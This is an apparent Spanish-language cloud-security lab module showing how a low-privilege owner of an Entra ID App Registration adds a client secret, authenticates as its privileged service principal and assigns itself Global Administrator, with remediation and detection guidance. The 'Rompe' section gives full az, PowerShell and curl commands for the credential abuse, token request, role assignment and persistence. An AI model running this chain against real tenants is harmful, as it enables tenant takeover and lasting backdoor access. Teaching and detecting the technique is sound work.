# AP04 — Abuso de credenciales de App Registration y persistencia de Service Principal

**Capa:** Identidad (Microsoft Entra ID) · identity-only  
**Coste:** ~$0 (una app registration + su service principal; Entra ID Free basta, a diferencia de AP03 que exige P1)  
**MITRE ATT&CK:** [T1098.001](https://attack.mitre.org/techniques/T1098/001/) (Account Manipulation: Additional Cloud Credentials — *nucleo*) · [T1098.003](https://attack.mitre.org/techniques/T1098/003/) (Account Manipulation: Additional Cloud Roles) · [T1078.004](https://attack.mitre.org/techniques/T1078/004/) (Valid Accounts: Cloud Accounts) · [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation — tecnica padre) · [T1087.004](https://attack.mitre.org/techniques/T1087/004/) (Account Discovery: Cloud Account)  
**Mapea a cert:** CARTP / CARTE (cadena canonica *app-owner → add secret → directory role assignment*; abuso de permisos de aplicacion tier-0 de Graph y persistencia de service principal) · CRTE (abuso de identidades y escalada en directorio) · angulo de persistencia cloud alineado con CRTO. Lado defensivo adyacente: SC-300, AZ-500.  
**Precondicion sembrada por el range:** la app registration `caelum-ap04-GraphSyncEngine`, su service principal, y el **admin-consent** del permiso de aplicacion de Graph `RoleManagement.ReadWrite.Directory` (`9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8`, `AdminConsentRequired = Yes`) sobre ese SP, con `caelum-user1` (usuario de **bajo privilegio**, sin rol de directorio) como **unico owner** de la app y del SP. El principal que ejecuta `terraform apply` necesita **Global Administrator** o **Privileged Role Administrator** para conceder ese admin-consent de forma declarativa (Application Administrator + Cloud Application Administrator **NO** bastan para consentir un permiso sensible de gestion de roles). **Lo que NO se siembra** (y es lo explotable): el owner anade credenciales a la app — comportamiento **por defecto** de Entra, lo ejecuta el alumno.

---

## 🎯 Objetivo didactico

Demostrar la cadena **canonica de abuso de ownership de App Registration**: un usuario de bajo privilegio que es *owner* de una aplicacion cuyo service principal porta un permiso de aplicacion tier-0 de Microsoft Graph puede, **sin ningun rol de directorio**, anadir sus propias credenciales a esa app, autenticarse como el SP privilegiado y auto-promocionarse a **Global Administrator** en un unico salto.

El AP separa con nitidez dos planos que a menudo se confunden:

1. **Primitivo explotable (no sembrado).** Por defecto en Entra, el owner de una aplicacion gestiona sus `passwordCredentials`/`keyCredentials` (`microsoft.directory/applications/credentials/update` esta delegado a los owners). Anadir un secret es, por tanto, comportamiento legitimo de la plataforma — sembrarlo falsearia el laboratorio. Lo ejecuta el alumno.
2. **Precondicion de permisos (sembrada, declarada).** El admin-consent del app role peligroso. No es "estado vulnerable magico": es una concesion de permisos que en el mundo real alguien con GA/PRA aprobo, y aqui se expresa 100 % como codigo con `azuread_app_role_assignment`.

**Contraste con AP03 (misma clase, distinto objeto).** AP03 abusa del *ownership de un grupo role-assignable* — el owner se auto-anade al grupo y **hereda** el rol de directorio asignado a ese grupo. AP04 abusa del *ownership de una App Registration* — el owner no hereda nada: anade **credenciales** y ejerce directamente el **permiso de aplicacion de Graph** del SP. Ambos son *ownership abuse* en Entra; AP03 opera sobre un objeto `group`, AP04 sobre un objeto `application`/`servicePrincipal` y su superficie de credenciales + app roles.

---

## 🔴 Rompe (como se explota)

> Laboratorio de entrenamiento autorizado, tenant de test propio. Todos los pasos como `caelum-user1` (bajo privilegio) salvo donde se indique.

### 1. Recon — enumerar objetos de los que soy owner (T1087.004)

Autenticacion interactiva del usuario de bajo privilegio y enumeracion de apps propias:

```bash
az login --allow-no-subscriptions

# Apps de las que caelum-user1 es owner
az rest --method GET \
  --url 'https://graph.microsoft.com/v1.0/me/ownedObjects/microsoft.graph.application?$select=id,appId,displayName'
```

Equivalentes:

```powershell
Connect-MgGraph -Scopes "User.Read"      # delegado minimo
Get-MgUserOwnedObject -UserId (Get-MgContext).Account |
  Where-Object { $_.AdditionalProperties['@odata.type'] -eq '#microsoft.graph.application' }
```

Confirmar que el SP de `caelum-ap04-GraphSyncEngine` porta el app role peligroso admin-consented (resourceId = SP de Microsoft Graph):

```bash
az rest --method GET \
  --url 'https://graph.microsoft.com/v1.0/servicePrincipals/<spObjectId>/appRoleAssignments'
# Buscar appRoleId == 9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8 (RoleManagement.ReadWrite.Directory)
```

Con grafo de ataque: **AzureHound → BloodHound** muestra la arista `AZOwns` de `caelum-user1` sobre la app y la capacidad `AZMGRoleManagement_ReadWrite_Directory` sobre el SP. **ROADtools** (`roadrecon gather` + plugin) o **AADInternals** sirven igual para el mapeo.

### 2. Abuso de credencial — anadir un client secret como owner (T1098.001, *no sembrado = default de Entra*)

```bash
# Anade (no reemplaza) un secret a la app
az ad app credential reset --id <appId> --append --display-name "svc-rotation" --years 2
# -> devuelve appId, password (el secret), tenant
```

Equivalentes:

```powershell
Add-MgApplicationPassword -ApplicationId <objectId> `
  -PasswordCredential @{ displayName = 'svc-rotation'; endDateTime = (Get-Date).AddYears(2) }
```

```bash
az rest --method POST \
  --url 'https://graph.microsoft.com/v1.0/applications/<objectId>/addPassword' \
  --body '{"passwordCredential":{"displayName":"svc-rotation"}}'
```

Variante con certificado (`addKey` / `keyCredentials`) via **AADInternals** o **roadtx** si se busca menor huella en `passwordCredentials`. Guardar `clientId`, `tenantId` y el secret.

### 3. Autenticarse como el Service Principal (T1078.004)

`client_credentials` grant — token **app-only** de Graph que porta `RoleManagement.ReadWrite.Directory`:

```bash
az login --service-principal -u <appId> -p <secret> --tenant <tenantId> --allow-no-subscriptions
```

O crudo (util para scripting y para re-emitir tras latencia de propagacion):

```bash
curl -s -X POST "https://login.microsoftonline.com/<tenantId>/oauth2/v2.0/token" \
  -d 'grant_type=client_credentials' \
  -d 'client_id=<appId>' \
  -d 'client_secret=<secret>' \
  -d 'scope=https://graph.microsoft.com/.default'
```

> **Caveat de propagacion.** El consent/credencial puede tardar en reflejarse en el token app-only. Reintentar / re-emitir el token si el `roleAssignments` devuelve `403` en el primer intento.

### 4. Escalada — self-assign Global Administrator (T1098.003 → T1078.004)

Con el token del SP, crear una `unifiedRoleAssignment` de Global Administrator sobre un principal controlado (el propio SP o `caelum-user1`):

```bash
curl -s -X POST "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  -H "Authorization: Bearer <sp_access_token>" \
  -H "Content-Type: application/json" \
  -d '{
        "principalId": "<SP_o_caelum-user1_objectId>",
        "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
        "directoryScopeId": "/"
      }'
```

`RoleManagement.ReadWrite.Directory` permite asignar **cualquier** rol de directorio, Global Administrator incluido, **directamente y en un solo salto** — no requiere paso intermedio por Privileged Role Administrator (`e8611ab8-c189-46e8-94e1-60213ab1f814` queda como alternativa). Es uno de los dos unicos app roles de Graph que *garantizan* escalada a GA (el otro es `AppRoleAssignment.ReadWrite.All`).

### 5. Toma del tenant

Ya como Global Administrator: crear/resetear usuarios, modificar politicas de Conditional Access, leer cualquier recurso, pivotar a Azure RM elevando acceso (`/providers/Microsoft.Authorization/elevateAccess`).

### 6. Persistencia (T1098.001 a escala)

> **Nota de persistencia.** El client secret/cert anadido en el paso 2 queda como **backdoor app-only** del SP privilegiado: **sobrevive al reset de contrasena de `caelum-user1`** y **a MFA** (los service principals no la aplican), con TTL fijado por el atacante (hasta ~2 anos). Expulsar al usuario del tenant no revoca la credencial. Segunda capa opcional: una vez con GA, anadir mas credenciales/owners a otras apps (`T1098` *Add owner to application*) o crear `roleAssignments` ocultas.

### Variantes tier-0 equivalentes (nota didactica)

Si el SP vulnerable portara, en lugar de `RoleManagement.ReadWrite.Directory`, cualquiera de estos app roles de Graph, la toma del tenant seria igualmente viable:

- **`AppRoleAssignment.ReadWrite.All`** (`06b708a9-e830-4db3-a914-8e69da51d44f`) — se **auto-promociona**: el SP puede concederse a si mismo otros app roles (incluido `RoleManagement.ReadWrite.Directory`) y desde ahi a GA. Es el segundo app role que garantiza GA, pero anade saltos (self-grant intermedio) y Microsoft lo ha ido endureciendo.
- **`Application.ReadWrite.All`** (`1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9`) — segunda capa de **persistencia de credenciales**: permite anadir secrets/owners a *otras* apps del tenant, incluidas apps que ya porten permisos tier-0.

AP04 elige `RoleManagement.ReadWrite.Directory` precisamente por ser la cadena **determinista de un solo salto**, sin depender de self-grants intermedios ni de que exista otro principal privilegiado.

---

## 🟢 Arregla (remediacion)

1. **Re-auditar la propiedad de apps/SP privilegiados.** Ningun usuario de bajo privilegio debe ser owner de una app cuyo SP porte `RoleManagement.ReadWrite.Directory` (u otro app role tier-0). Enumerar y corregir:
   ```powershell
   Get-MgApplication -All | ForEach-Object {
     $o = Get-MgApplicationOwner -ApplicationId $_.Id
     [pscustomobject]@{ App = $_.DisplayName; Owners = ($o.AdditionalProperties.userPrincipalName -join ',') }
   }
   Remove-MgApplicationOwnerByRef -ApplicationId <objectId> -DirectoryObjectId <ownerId>
   ```
   En el lab: `./caelum.ps1 reset` (re-aplica con `enable_ap04 = false`, `count = 0`, destruye la app, el SP y el `azuread_app_role_assignment`).

2. **Tratar los app roles de Graph tier-0 como lo que son.** `RoleManagement.ReadWrite.Directory`, `AppRoleAssignment.ReadWrite.All` y `Application.ReadWrite.All` son equivalentes a Global Administrator. Inventariar que SPs los portan (`Get-MgServicePrincipalAppRoleAssignment` sobre el SP de Graph), retirar los innecesarios y exigir aprobacion de GA para concederlos.

3. **Restringir la adicion de credenciales por owners.** Aplicar **App Management Policies** (Microsoft Entra *application authentication methods policy*): bloquear `passwordCredentials`, exigir certificados de vida corta, limitar quien gestiona credenciales. Esto endurece exactamente el primitivo por defecto (*owner-add-creds*) que habilita AP04 — documentado tambien como caveat (b) mas abajo.

4. **Eliminar secrets estaticos.** Preferir **workload identity federation** / **managed identities** frente a client secrets; rotar e inventariar credenciales de SP; aplicar **Conditional Access for workload identities**; `accessReviews` periodicas sobre owners de apps y sobre SPs con app roles de Graph.

5. **Monitorizar la cadena en AuditLogs** (ver seccion siguiente), con prioridad a eventos cuyo `InitiatedBy` sea un usuario de bajo privilegio.

6. **Alertar sobre el self-grant app-only.** Cualquier creacion de `roleAssignment` de Global Administrator / Privileged Role Administrator cuyo `InitiatedBy` sea un **service principal** (no un admin interactivo) es la firma directa de esta tecnica.

---

## 🔵 Detecta

Reglas de deteccion incluidas en el range:

- KQL (Microsoft Sentinel / Advanced Hunting): [`../../detections/kql/AP04-app-credential-abuse.kql`](../../detections/kql/AP04-app-credential-abuse.kql)
- Sigma: [`../../detections/sigma/AP04-app-credential-abuse.yml`](../../detections/sigma/AP04-app-credential-abuse.yml)

**Senales (tabla `AuditLogs` de Entra):**

| Senal | `OperationName` | Que mirar |
|---|---|---|
| Alta de secret/cert por el owner (T1098.001) | `Update application – Certificates and secrets management` · `Update application` · `Add service principal credentials` (solo si la credencial se añade directamente al SP) | `InitiatedBy` = usuario **no admin**; `TargetResources` = la app; `ModifiedProperties` con `KeyDescription`/`passwordCredentials` anadidas |
| Admin-consent del app role peligroso (precondicion) | `Add app role assignment to service principal` | `TargetResources` incluye el app role de Graph (`9e3f62cf-...`) |
| Owner anadido a la app (precondicion / persistencia) | `Add owner to application` | `InitiatedBy` inusual; owner de bajo privilegio |
| Self-grant de rol de directorio por un SP (escalada) | `Add member to role` | `InitiatedBy` = **service principal**; rol = Global Administrator / Privileged Role Administrator |

Columnas reales usadas por las reglas: `OperationName`, `InitiatedBy`, `TargetResources`, `Result`, `ModifiedProperties`. La correlacion de maximo valor es la **secuencia**: `Update application – Certificates and secrets management` (alta de credencial) por un usuario de bajo privilegio → en minutos → `Add member to role` (Global Administrator) `InitiatedBy` un SP.

---

## 📚 Referencias

- MITRE ATT&CK — [T1098.001](https://attack.mitre.org/techniques/T1098/001/), [T1098.003](https://attack.mitre.org/techniques/T1098/003/), [T1078.004](https://attack.mitre.org/techniques/T1078/004/), [T1098](https://attack.mitre.org/techniques/T1098/), [T1087.004](https://attack.mitre.org/techniques/T1087/004/)
- SpecterOps — *Azure Privilege Escalation via Service Principal Abuse* / app roles de Graph que garantizan Global Administrator (`RoleManagement.ReadWrite.Directory`, `AppRoleAssignment.ReadWrite.All`)
- Merill Fernando — [graphpermissions.merill.net · RoleManagement.ReadWrite.Directory](https://graphpermissions.merill.net/permission/RoleManagement.ReadWrite.Directory) (app role `9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8`, delegado `d01b97e9-cbc0-49fe-810a-750afd5527a3`, `AdminConsentRequired = Yes` — validado 2026-11-14)
- Microsoft Learn — *App registration owners*, *Application authentication methods policy (App Management Policies)*, *roleManagement/directory/roleAssignments*, *Workload identity federation*, *Conditional Access for workload identities*
- Microsoft Learn — *Microsoft Graph permissions reference* (resource app id `00000003-0000-0000-c000-000000000000`); roleTemplateId Global Administrator `62e90394-69f5-4237-9190-012177145e10`
- Herramientas: ROADtools (`roadrecon`/`roadtx`), AADInternals, AzureHound / BloodHound, Microsoft Graph PowerShell SDK, `az` CLI
- Comparar con [AP03](./AP03-role-assignable-group.md) — ownership abuse sobre un **grupo** role-assignable (herencia de rol) vs. AP04, ownership abuse sobre una **App Registration** (credenciales + app role de Graph)
